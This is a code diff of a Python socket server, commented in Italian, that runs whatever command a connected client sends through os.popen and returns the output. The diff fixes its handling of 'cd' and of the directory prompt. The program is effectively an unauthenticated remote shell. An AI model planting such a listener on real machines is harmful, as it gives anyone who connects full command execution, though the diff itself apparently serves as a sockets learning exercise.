@@ -17,8 +17,8 @@ print("Client connesso con indirizzo:", address)
 # per dialogare dobbiamo avviare un loop che gestisca la connessione
 while True:
     # invio un prompt
-    path = os.popen("pwd").read().rstrip('\n').encode()
-    connection.sendall(path + b"$ ")
+    path = os.getcwd()
+    connection.sendall(path.encode() + b"$ ")
     # Mi metto in attesa dello stream de client
     data = connection.recv(1024)
     # Se il client chiude la connessione data sara' vuoto
@@ -29,11 +29,11 @@ while True:
     # nb: utf-8 e' la codifica del terminale
     # pulisco da \n
     comando = data.decode('utf-8').rstrip("\n")
-    print(comando)
-    esegui = os.popen(comando).read().rstrip('\n')
-    if esegui.startswith("cd"):
-        os.chdir(esegui.split(" ")[1])
+    # print(comando)
+    if comando.startswith("cd "):
+        os.chdir(comando.split(" ")[1])
     else:
+        esegui = os.popen(comando).read().rstrip('\n')
         connection.sendall(esegui.encode() + "\n".encode())
 
 connection.close()
